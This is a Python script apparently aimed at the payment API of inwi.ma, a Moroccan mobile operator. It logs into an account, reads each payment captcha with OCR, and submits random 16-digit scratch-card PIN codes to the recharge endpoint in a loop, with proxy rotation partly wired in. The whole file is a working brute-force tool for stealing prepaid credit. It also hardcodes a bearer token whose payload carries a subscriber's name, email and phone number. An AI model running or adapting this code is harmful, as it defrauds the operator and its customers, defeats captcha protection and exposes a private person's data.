import requests
import os , sys , re 
import pytesseract
from PIL import Image
import io , base64 , pyfiglet
from colorama import Fore
import random , json
R = Fore.RED 
Y = Fore.YELLOW 
G = Fore.GREEN
C = Fore.CYAN
B = Fore.BLUE
W = Fore.WHITE
style = f"{C}[{Y}+{C}]"
session = requests.Session()
os.system("clear")
print(B + pyfiglet.figlet_format("I N W I"))
def getproxies():
  proxys = []
  with open("working_proxies.txt", "r") as file:
    for proxy in file:
      proxys.append(proxy.strip())
    return proxys
def extract_text_from_base64_image(image_base64):
    image_base64 = image_base64.split(',')[1]
    image_bytes = base64.b64decode(image_base64)
    image = Image.open(io.BytesIO(image_bytes))
    return pytesseract.image_to_string(image).strip()
def login_inwi_account(username, password):
   print(f"{style}{W} Login inwi by {B}{username}{Y}{B}:{password}{W}")
   url = "https://ms-prod.inwi.ma/api/ms-iam/v1/signin"
   payload = {
   "username": username,
   "password": password
   }
   headers = {
   'User-Agent': "Mozilla/5.0 (Linux; Android 15; SM-A065F Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.97 Mobile Safari/537.36",
   'Accept': "application/json, text/plain, */*",
   'Accept-Encoding': "gzip, deflate, br, zstd",
   'Content-Type': "application/json",
   'sdata': "eyJjaGFubmVsIjoid2ViIiwiYXBwbGljYXRpb25fb3JpZ2luIjoibXlpbndpIiwidXVpZCI6ImI3YTFmNDVmLWEyNDEtNDVkYi1hNGUzLWQyYjc5OWM0MDI2MyIsImxhbmd1YWdlIjoiZnIiLCJhcHBWZXJzaW9uIjoxfQ==",
   'sec-ch-ua-platform': "\"Android\"",
   'sec-ch-ua': "\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
   'sec-ch-ua-mobile': "?1",
   'origin': "https://inwi.ma",
   'x-requested-with': "mark.via.gp",
   'sec-fetch-site': "same-site",
   'sec-fetch-mode': "cors",
   'sec-fetch-dest': "empty",
   'referer': "https://inwi.ma/",
   'accept-language': "ar-MA,ar;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6",
   'priority': "u=1, i"}
   response = session.post(url, data=json.dumps(payload), headers=headers).json()
   if "error" in response :
     return f"{style}{R}error from username or password"
   elif "accessToken" in response :
     return response["accessToken"]
   else:
     return response
def getInfo(token):
     payload = token.split('.')[1]
     decoded=base64.b64decode(payload + '=' * (-len(payload) % 4))
     data = json.loads(decoded)
     print(f"{style}{W}Name{C}:{W}", data['name'])
     print(f"{style}{W}Email{C}:{W}", data['email'])
def random_number():
  return ''.join(random.choice("1029384756")for _ in range(16))
def captcha(token):
     url = "https://api.inwi.ma/api/v1/ms-payment/captcha/generate"
     headers = {
     'User-Agent': "Mozilla/5.0 (Linux; Android 15; SM-A065F Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.97 Mobile Safari/537.36",
     'Accept-Encoding': "gzip, deflate, br, zstd",
     'sdata': "eyJjaGFubmVsIjoid2ViIiwiYXBwbGljYXRpb25fb3JpZ2luIjoibXlpbndpIiwidXVpZCI6Ijk5ZmNjYTBiLTg2ODUtNDQ1Ny1hNjViLTdiZThjOTg5NjU1MiIsImxhbmd1YWdlIjoiZnIiLCJhcHBWZXJzaW9uIjoxfQ==",
     'sec-ch-ua-platform': "\"Android\"",
     'authorization': f"Bearer {token}",
     'mdn-segmentation-token': "Bearer eyJhbGciOiJSUzI1NiJ9.eyJwbGFuX3R5cGUiOiJCMkMiLCJmaXJzdG5hbWUiOiJNb2hhbWVkICIsImNpdmlsaXR5IjoibW1lIiwibGFuZ3VhZ2UiOiJmciIsInNpZCI6IjQzMmY2N2QxLWI5MGItNDc5NS1iYjhhLTZjZTJiYjIzNDlhZSIsInJlY3VycmluZ19hbW91bnQiOiIyMC4wMCIsInNlZ21lbnQiOiJwcmVwYWlkIiwibW90aWYiOiJvdHAiLCJvZmZlcl90eXBlIjoibW9iaWxlLW9mZmVyIiwiZW1haWwiOiJkZXZib3VncmluYUBnbWFpbC5jb20iLCJjbGllbnRJZCI6IjYzNTc2MzAiLCJwcm9kdWN0SWQiOiJTRkIyQyIsImlzTWFpbCI6InRydWUiLCJwcm9maWxlIjoiODQwMDEiLCJvZmZlcl9uYW1lIjoiT2ZmcmUgc2FucyBhYm9ubmVtZW50IiwiaW5zIjoiYTRrNEswMDAwMDRyQ1JaUUEyIiwibGFzdG5hbWUiOiJCb3VncmluYSAiLCJtZG4iOiIwNjgwMDMzNTcwIiwib2ZmZXJDb2RlIjoiSU5XSUIyQ19PRkZFUklOR19USUNUQUNfU0FOU19URVJNSU5BTCIsInJlbGF0ZWRQYXJ0eUlkIjoiMDAxNEswMDAwMG1MZ2dRUUFTIiwib2ZmZXJJZCI6Ijg3MSIsInN1YnNjcmlwdGlvbl90eXBlIjoibW9iaWxlIiwidXNlcm5hbWUiOiIwNjgwMDMzNTcwIiwiaXNzIjoibXlpbndpLm1hIiwiaWF0IjoxNzYwOTg2MjI4LCJleHAiOjE3NjEwNzI2Mjh9.hWE9Nq27O7kVdjrDH53n79U1BvTdSiDKTOAzGsWMCM3uUFvZzayGigxpYtrf-g0AW_0S4Nub468Ddu7cteVAKNiIjN6OWI_1sZQpOH3230s27F1OslGXe96woYUoEsLv2qiIzMXvJu6jB_6Im6DJm0md2RFMO5xTvSOBSb_pnj57-PBZRyXQYE_nznxqTaQ8A6K-HlX-ABQKAfLNSjja3nqsq_yE1rLdAgmU61m-Dz-bYB3NS2Okw-1CjAOqRe3hnTEPSHZtIhkyZa-w8vnveVVHLQ8CHfVeWVuEJhmqRdL9D6WCk6TjbSelJLmbtoKOjxSLu1pZhj7BcT-p1YeUvg",
     'sec-ch-ua': "\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
     'sec-ch-ua-mobile': "?1",
     'Origin': "https://inwi.ma",
     'Sec-Fetch-Site': "same-site",
     'Sec-Fetch-Mode': "cors",
     'Sec-Fetch-Dest': "empty",
     'Referer': "https://inwi.ma/",
     'Accept-Language': "ar-MA,ar;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6",
     'If-None-Match': "W/\"963-JuihHApiBoMAdQvFQA7PDW5X+oI:dtagent10323250822043923+I/b:dtagent10323250822043923+I/b\""
     }
     response = session.get(url, headers=headers).json()
     if "captcha" in response:
       return response["captcha"], response["reqId"]
     else:
       print(f"{style}Error from response captcha :-(")
def recharge(token):
     img , datas = captcha(token)
     print(f"{style}{W}get text from captcha : " + extract_text_from_base64_image(img))
     print(f"{style}{W}get reqid : {datas}")
     number = random_number()
     print(f"{style}{W}Testing code : {number}")
     url = f"https://api.inwi.ma/api/v1/ms-payment/recharge/scratch/amount?pinCode={number}&reqId={datas}&captcha={extract_text_from_base64_image(img)}"
     headers = {
     'User-Agent': "Mozilla/5.0 (Linux; Android 15; SM-A065F Build/AP3A.240905.015.A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.97 Mobile Safari/537.36",
     'Accept': "application/json, text/plain, */*",
     'Accept-Encoding': "gzip, deflate, br, zstd",
     'sdata': "eyJjaGFubmVsIjoid2ViIiwiYXBwbGljYXRpb25fb3JpZ2luIjoibXlpbndpIiwidXVpZCI6ImRjMjY5OTc0LTdmNjItNGY3MC04Mjg5LTY1NDQ5ZjY1NjhhMCIsImxhbmd1YWdlIjoiZnIiLCJhcHBWZXJzaW9uIjoxfQ==",
      'sec-ch-ua-platform': "\"Android\"",
      'Authorization': f"Bearer {token}",
     'sec-ch-ua': "\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"",
     'sec-ch-ua-mobile': "?1",
     'mdn-segmentation-token': "Bearer eyJhbGciOiJSUzI1NiJ9.eyJwbGFuX3R5cGUiOiJCMkMiLCJmaXJzdG5hbWUiOiJNb2hhbWVkICIsImNpdmlsaXR5IjoibW1lIiwibGFuZ3VhZ2UiOiJmciIsInNpZCI6IjQzMmY2N2QxLWI5MGItNDc5NS1iYjhhLTZjZTJiYjIzNDlhZSIsInJlY3VycmluZ19hbW91bnQiOiIyMC4wMCIsInNlZ21lbnQiOiJwcmVwYWlkIiwibW90aWYiOiJvdHAiLCJvZmZlcl90eXBlIjoibW9iaWxlLW9mZmVyIiwiZW1haWwiOiJkZXZib3VncmluYUBnbWFpbC5jb20iLCJjbGllbnRJZCI6IjYzNTc2MzAiLCJwcm9kdWN0SWQiOiJTRkIyQyIsImlzTWFpbCI6InRydWUiLCJwcm9maWxlIjoiODQwMDEiLCJvZmZlcl9uYW1lIjoiT2ZmcmUgc2FucyBhYm9ubmVtZW50IiwiaW5zIjoiYTRrNEswMDAwMDRyQ1JaUUEyIiwibGFzdG5hbWUiOiJCb3VncmluYSAiLCJtZG4iOiIwNjgwMDMzNTcwIiwib2ZmZXJDb2RlIjoiSU5XSUIyQ19PRkZFUklOR19USUNUQUNfU0FOU19URVJNSU5BTCIsInJlbGF0ZWRQYXJ0eUlkIjoiMDAxNEswMDAwMG1MZ2dRUUFTIiwib2ZmZXJJZCI6Ijg3MSIsInN1YnNjcmlwdGlvbl90eXBlIjoibW9iaWxlIiwidXNlcm5hbWUiOiIwNjgwMDMzNTcwIiwiaXNzIjoibXlpbndpLm1hIiwiaWF0IjoxNzYwOTg2MjI4LCJleHAiOjE3NjEwNzI2Mjh9.hWE9Nq27O7kVdjrDH53n79U1BvTdSiDKTOAzGsWMCM3uUFvZzayGigxpYtrf-g0AW_0S4Nub468Ddu7cteVAKNiIjN6OWI_1sZQpOH3230s27F1OslGXe96woYUoEsLv2qiIzMXvJu6jB_6Im6DJm0md2RFMO5xTvSOBSb_pnj57-PBZRyXQYE_nznxqTaQ8A6K-HlX-ABQKAfLNSjja3nqsq_yE1rLdAgmU61m-Dz-bYB3NS2Okw-1CjAOqRe3hnTEPSHZtIhkyZa-w8vnveVVHLQ8CHfVeWVuEJhmqRdL9D6WCk6TjbSelJLmbtoKOjxSLu1pZhj7BcT-p1YeUvg",
      'Origin': "https://inwi.ma",
      'X-Requested-With': "mark.via.gp",
      'Sec-Fetch-Site': "same-site",
      'Sec-Fetch-Mode': "cors",
      'Sec-Fetch-Dest': "empty",
     'Referer': "https://inwi.ma/",
     'Accept-Language': "ar-MA,ar;q=0.9,en-GB;q=0.8,en-US;q=,en;q=0.6"
     }
     response = session.get(url, headers=headers).json()
     print(f"{style}{W} {response}")
     
username = input(f"{style} Enter username : ")
password = input(f"{style} Enter password : ")
loop = input(f"{style} Enter loop numer : ")
token = login_inwi_account(username, password)
if "error" in token:
  print(f"{style} {W}{token}")
else:
  getInfo(token)
  for i in range(int(loop)):
     proxie = getproxies()
     proxy = random.choice(proxie)
     print(f"{style}{W} selected proxy : {Y}{proxy}")
    # proxies = {
     #  "http":"http://{proxy}",
      # "https":"http://{proxy}"
     #}
     #session.proxies = proxies
     recharge(token)
     print(f"{style}{W} Testing number : {Y}{i}")
  
  
